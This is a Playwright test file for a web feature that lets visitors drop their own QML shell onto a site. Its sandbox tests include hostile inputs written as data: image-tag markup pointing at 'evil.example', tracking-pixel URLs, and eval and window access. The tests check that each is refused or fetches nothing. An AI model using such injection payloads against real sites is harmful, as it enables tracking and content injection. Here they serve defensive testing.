// A live shell (docs/LJOS_WEB.md A9): a visitor drops a shell of their own
// over a site's blocks. The page is tests/drop.html, a site built with
// `liveShell` whose own shell is scenes/drop/Shell.qml.
import { expect, test } from "./open.js";

async function opened(page) {
  await page.goto("/drop.html");
  await page.waitForFunction(() => window.ready);
  await page.evaluate(() => {
    const search = (from, name) => {
      const queue = [...(from.children ?? [])];
      while (queue.length) {
        const at = queue.shift();
        if (at.objectName === name) return at;
        queue.push(...(at.children ?? []));
      }
      return null;
    };
    window.named = (name) => (window.scene.objectName === name ? window.scene : search(window.scene, name));
  });
}

const read = (page, name, property) => page.evaluate(([name, property]) => window.named(name)?.[property], [name, property]);

async function dropped(page, text) {
  await page.evaluate((text) => window.live.drop(text), text);
  await page.evaluate(() => window.flush());
}

const errors = (page) => page.getByRole("alert");

// A shell of the visitor's over the site's one block. Its root is of the
// site's root's type: one of another type is a new tree (reload.js), whose
// plain items start anew while the blocks keep theirs.
const MINE = `import QtQuick
import Shop

Column {
    objectName: "mine"
    Rectangle { id: swatch; objectName: "swatch"; width: 40; height: 20; color: "red" }
    Basket { id: basket; objectName: "basket"; onAdded: (count) => label.said = count }
    Text { id: label; objectName: "label"; property int said: 0; text: "Mine " + basket.count + " " + said }
}
`;

const over = (body) => `import QtQuick
import Shop

Column {
    Basket { id: basket; objectName: "basket" }
${body}
}
`;

test.describe("A visitor drops a shell of their own", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  test("A dropped shell is shown and keeps the blocks' state", async ({ page }) => {
    await opened(page);
    expect(await read(page, "label", "text")).toBe("Default 0");
    await page.evaluate(() => {
      window.before = window.named("basket");
      window.before.add();
      window.before.add();
      window.named("swatch").color = "blue";
      window.blue = String(window.named("swatch").color);
    });
    await dropped(page, MINE);
    await expect(errors(page)).toBeHidden();
    expect(await read(page, "mine", "objectName")).toBe("mine");
    // The block is the one the site's shell showed, with what was bought.
    expect(await page.evaluate(() => window.named("basket") === window.before)).toBe(true);
    expect(await read(page, "label", "text")).toBe("Mine 2 0");
    // A plain item by the same id keeps what the visitor gave it.
    expect(await page.evaluate(() => String(window.named("swatch").color) === window.blue)).toBe(true);
    // The shell's handler hears the block's event.
    await page.evaluate(() => window.named("basket").add());
    await page.evaluate(() => window.flush());
    expect(await read(page, "label", "text")).toBe("Mine 3 3");
    expect(await page.locator("#scene").textContent()).toContain("Mine 3 3");
  });

  test("A shell is opened from a file with the keyboard", async ({ page }) => {
    await opened(page);
    const open = page.getByRole("button", { name: "Open a shell…" });
    await open.focus();
    const chooser = page.waitForEvent("filechooser");
    await page.keyboard.press("Enter");
    await (await chooser).setFiles({ name: "Mine.qml", mimeType: "text/plain", buffer: Buffer.from(MINE) });
    await expect(page.getByRole("status")).toHaveText("Your shell is shown");
    expect(await read(page, "mine", "objectName")).toBe("mine");
  });

  test("A shell is dropped on the page", async ({ page }) => {
    await opened(page);
    const transfer = await page.evaluateHandle((text) => {
      const transfer = new DataTransfer();
      transfer.items.add(new File([text], "Mine.qml", { type: "text/plain" }));
      return transfer;
    }, MINE);
    const region = page.getByRole("region", { name: "Shell" });
    await region.dispatchEvent("dragover", { dataTransfer: transfer });
    await region.dispatchEvent("drop", { dataTransfer: transfer });
    await expect(page.getByRole("status")).toHaveText("Your shell is shown");
    expect(await read(page, "mine", "objectName")).toBe("mine");
  });

  test("A broken shell says where it is broken and the page keeps running", async ({ page }) => {
    await opened(page);
    await page.evaluate(() => window.named("basket").add());
    await dropped(page, "import QtQuick\n\nColumn {\n    Text { text: ( }\n}\n");
    await expect(errors(page)).toBeVisible();
    await expect(errors(page)).toHaveText(/^Shell\.qml:4:\d+: /);
    // The site's shell is still shown, and still runs.
    expect(await read(page, "label", "text")).toBe("Default 1");
    await page.evaluate(() => window.named("basket").add());
    await page.evaluate(() => window.flush());
    expect(await read(page, "label", "text")).toBe("Default 2");
    // A shell that compiles takes the error away.
    await dropped(page, MINE);
    await expect(errors(page)).toBeHidden();
  });
});

test.describe("A block is its module's", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  // Shell.qml's Shop Basket and Later.qml's Cart Basket share a name and
  // an id; each is held apart all the same.
  test("A block of a name and id another module's block has is its own", async ({ page }) => {
    await opened(page);
    expect(await read(page, "later", "kind")).toBe("set aside");
    expect(await read(page, "later", "count")).toBeUndefined();
    expect(await read(page, "basket", "count")).toBe(0);
  });
});

test.describe("A shell names only what is in its scope", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  const refusals = [
    ["a page global", over(`    Text { text: window.location.href }`), /^Shell\.qml:6:\d+: `window` is not in a shell's scope/],
    ["eval", over(`    Text { text: eval("1") }`), /^Shell\.qml:6:\d+: `eval` is not in a shell's scope/],
    [
      "a Qt function that reaches out",
      over(`    MouseArea { onClicked: Qt.openUrlExternally("https://example.com") }`),
      /^Shell\.qml:6:\d+: `Qt\.openUrlExternally` is not in a shell's scope/,
    ],
    ["a member by a string", over(`    Text { text: basket["constructor"] }`), /^Shell\.qml:6:\d+: .*not by a string/],
    [
      "a URL the shell names for an image",
      over(`    Image { source: "https://tracker.example/pixel.png" }`),
      /^Shell\.qml:6:\d+: Image\.source takes only a URL a block gives/,
    ],
    [
      "a URL through a local named as a block is",
      over(`    Item { id: mine; property string cover: "https://tracker.example/pixel.png" }\n    Image { id: pic }\n    MouseArea { onClicked: { let basket = mine; pic.source = basket.cover } }`),
      /^Shell\.qml:8:\d+: Image\.source takes only a URL a block gives/,
    ],
    [
      "a member of its own over an image's source",
      over(`    Image { property string source: "https://tracker.example/pixel.png" }`),
      /^Shell\.qml:6:\d+: a shell declares nothing over Image's own `source`/,
    ],
    [
      "a URL the shell adds to an image's",
      over(`    Image { id: pic }\n    MouseArea { onClicked: pic.source += "https://tracker.example/pixel.png" }`),
      /^Shell\.qml:7:\d+: Image\.source takes only a URL a block gives/,
    ],
    [
      "an import beyond QtQuick and the blocks",
      "import QtQuick\nimport QtQuick.Controls\nimport Shop\n\nColumn {}\n",
      /^Shell\.qml:2:\d+: a shell may import only `QtQuick`, `Shop`, not `QtQuick\.Controls`/,
    ],
  ];
  for (const [what, text, said] of refusals) {
    test(`A shell that names ${what} is refused where it does`, async ({ page }) => {
      await opened(page);
      await dropped(page, text);
      await expect(errors(page)).toHaveText(said);
      expect(await read(page, "label", "text")).toBe("Default 0");
      expect(await page.evaluate(() => localStorage.length)).toBe(0);
    });
  }

  test("A URL a block gives is one a shell may show", async ({ page }) => {
    await opened(page);
    await dropped(page, over(`    Image { objectName: "cover"; source: basket.cover }`));
    await expect(errors(page)).toBeHidden();
    expect(await page.evaluate(() => String(window.named("cover").source) === String(window.named("basket").cover))).toBe(true);
  });
});

test.describe("A binding that runs away", () => {
  test.use({ told: [/Shell\.qml:6:\d+: the binding of text ran past its budget of 100000 steps and was stopped/] });
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  test("A runaway binding is stopped and warned of", async ({ page }) => {
    const warned = [];
    page.on("console", (message) => message.type() === "warning" && warned.push(message.text()));
    await opened(page);
    await dropped(page, over(`    Text { objectName: "label"; text: { var n = 0; while (true) { n = n + 1 } return n } }`));
    await expect(errors(page)).toBeHidden();
    expect(warned.some((line) => /Shell\.qml:6:\d+: the binding of text ran past its budget/.test(line))).toBe(true);
    // The page still runs.
    await page.evaluate(() => window.named("basket").add());
    await page.evaluate(() => window.flush());
    expect(await read(page, "basket", "count")).toBe(1);
  });
});

test.describe("A shell's text names no URL, however it reaches a text", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));
  const EVIL = "https://evil.example/x.png";
  const fetched = (page) => {
    const asked = [];
    page.on("request", (request) => request.url().startsWith("https://evil.example") && asked.push(request.url()));
    return asked;
  };
  const pictures = (page, name) => page.evaluate((name) => [...window.named(name).$node.querySelectorAll("img")].filter((image) => image.hasAttribute("src")).length, name);

  for (const [what, line, name] of [
    ["given to a block that is a Text", `    Title { objectName: "given"; text: "<img src='${EVIL}'>" }`, "given"],
    ["bound with a block's state", `    Title { objectName: "given"; text: "<img src='${EVIL}?" + basket.count + "'>" }`, "given"],
    ["passed on by a block to its own Text", `    Headline { objectName: "given"; title: "<img src='${EVIL}'>" }`, "given"],
  ]) {
    test(`Markup ${what} fetches nothing`, async ({ page }) => {
      const asked = fetched(page);
      await opened(page);
      await dropped(page, over(line));
      await expect(errors(page)).toBeHidden();
      await page.waitForTimeout(100);
      expect(asked).toEqual([]);
      expect(await pictures(page, name)).toBe(0);
    });
  }

  test("Markup a handler writes to a block fetches nothing", async ({ page }) => {
    const asked = fetched(page);
    await opened(page);
    await dropped(page, over(`    Title { id: told; objectName: "given" }\n    MouseArea { objectName: "tap"; width: 10; height: 10; onClicked: told.text = "<img src='${EVIL}'>" }`));
    await page.evaluate(() => {
      window.named("tap").clicked({ x: 0, y: 0 });
      window.flush();
    });
    await page.waitForTimeout(100);
    expect(await read(page, "given", "text")).toContain("evil.example");
    expect(asked).toEqual([]);
    expect(await pictures(page, "given")).toBe(0);
  });

  test("A link a shell's markup names is no link", async ({ page }) => {
    await opened(page);
    await dropped(page, over(`    Title { objectName: "given"; text: "<a href='${EVIL}'>go</a>" }`));
    expect(await page.evaluate(() => window.named("given").$node.querySelectorAll("[data-link]").length)).toBe(0);
  });

  test("The site's own markup has its pictures again when its shell is back", async ({ page }) => {
    await opened(page);
    expect(await pictures(page, "note")).toBe(1);
    await dropped(page, over('    Note { objectName: "note" }'));
    await expect.poll(() => pictures(page, "note")).toBe(0);
    await page.getByRole("button", { name: "Reset" }).click();
    await page.evaluate(() => window.live.idle());
    await expect.poll(() => pictures(page, "note")).toBe(1);
  });

  test("A shell refused over the site's leaves the site's markup its pictures", async ({ page }) => {
    await opened(page);
    await dropped(page, "import QtQuick\nColumn { NoSuchThing {} }\n");
    await expect(errors(page)).toBeVisible();
    expect(await pictures(page, "note")).toBe(1);
  });
});

test.describe("Each use of a block is its own", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));
  const cards = (page) =>
    page.evaluate(() => {
      const found = new Set();
      const walk = (from) => {
        for (const child of from.children ?? []) {
          if (child.objectName === "card") found.add(child);
          walk(child);
        }
      };
      walk(window.scene);
      return [...found].map((card) => card.hits);
    });

  test("A site's unnamed uses and a Repeater's delegates stay apart", async ({ page }) => {
    await opened(page);
    expect(await cards(page)).toHaveLength(4);
    const delegates = await page.evaluate(() => {
      const repeater = window.named("cards").children.find((child) => child.itemAt);
      const [first, second] = [repeater.itemAt(0), repeater.itemAt(1)];
      return { apart: first !== second, named: first.objectName, shown: first.$node.isConnected, below: second.y > first.y };
    });
    expect(delegates).toEqual({ apart: true, named: "card", shown: true, below: true });
  });

  test("Unnamed uses in a dropped shell stay apart, and keep what each held", async ({ page }) => {
    await opened(page);
    const shell = `import QtQuick
import Shop

Column {
    objectName: "mine"
    Card { id: first }
    Card { id: second }
    Card {}
    Card {}
    MouseArea { objectName: "tap"; onClicked: { first.hit(); second.hit(); second.hit() } }
}
`;
    await dropped(page, shell);
    expect(await cards(page)).toHaveLength(4);
    await page.evaluate(() => {
      window.named("tap").clicked({ x: 0, y: 0 });
      window.flush();
    });
    const hits = await cards(page);
    expect(hits.toSorted()).toEqual([0, 0, 1, 2]);
    await dropped(page, shell);
    expect((await cards(page)).toSorted()).toEqual([0, 0, 1, 2]);
  });
});

test.describe("A visitor's shell is kept", () => {
  test("A reload of the page shows the shell the visitor dropped", async ({ page }) => {
    await page.goto("/drop.html");
    await page.evaluate(() => localStorage.clear());
    await opened(page);
    await dropped(page, MINE);
    await page.reload();
    await opened(page);
    expect(await read(page, "mine", "objectName")).toBe("mine");
    await expect(page.getByRole("status")).toHaveText("Your shell is shown");
  });

  test("Reset shows the site's shell and forgets the visitor's", async ({ page }) => {
    await page.goto("/drop.html");
    await page.evaluate(() => localStorage.clear());
    await opened(page);
    await page.evaluate(() => window.named("basket").add());
    await dropped(page, MINE);
    await page.getByRole("button", { name: "Reset" }).click();
    await page.evaluate(() => window.live.idle());
    expect(await read(page, "label", "text")).toBe("Default 1");
    expect(await page.evaluate(() => localStorage.length)).toBe(0);
    await page.reload();
    await opened(page);
    expect(await read(page, "label", "text")).toBe("Default 0");
  });
});

test.describe("The compiler is fetched when it is needed", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  test("A compiler that could not be fetched is fetched again by the next drop", async ({ page }) => {
    let refused = 0;
    await page.route(/ljos_web_compiler\.wasm/, (route) => (refused++ === 0 ? route.abort() : route.continue()));
    await opened(page);
    await dropped(page, MINE);
    await expect(errors(page)).toContainText("the compiler could not be loaded");
    await dropped(page, MINE);
    await expect(errors(page)).toBeHidden();
    expect(await read(page, "mine", "objectName")).toBe("mine");
    expect(refused).toBe(2);
  });
});

test.describe("A visitor publishes their shell", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  test("Publish gives the site's hook the shell and what it uses, and shows its answer", async ({ page }) => {
    await opened(page);
    await dropped(page, MINE);
    await page.getByRole("button", { name: "Publish" }).click();
    await expect(page.getByRole("status")).toHaveText("Published: https://shells.example/1");
    const published = await page.evaluate(() => window.published);
    expect(published.text).toBe(MINE);
    expect(published.meta.blocks).toEqual([{ module: "Shop", name: "Basket", version: "1.0" }]);
    expect(published.meta.hash).toMatch(/^[0-9a-f]{64}$/);
  });

  test("A publish that works after one that failed takes the failure away", async ({ page }) => {
    await opened(page);
    await dropped(page, MINE);
    await page.evaluate(() => (window.publishing.error = "the shelf is full"));
    await page.getByRole("button", { name: "Publish" }).click();
    await expect(errors(page)).toHaveText("Publish failed: the shelf is full");
    await page.evaluate(() => (window.publishing.error = null));
    await page.getByRole("button", { name: "Publish" }).click();
    await expect(page.getByRole("status")).toHaveText("Published: https://shells.example/1");
    await expect(errors(page)).toBeHidden();
  });

  test("A publish that fails says so", async ({ page }) => {
    await opened(page);
    await dropped(page, MINE);
    await page.evaluate(() => (window.publishing.error = "the shelf is full"));
    await page.getByRole("button", { name: "Publish" }).click();
    await expect(errors(page)).toHaveText("Publish failed: the shelf is full");
    expect(await read(page, "mine", "objectName")).toBe("mine");
  });
});
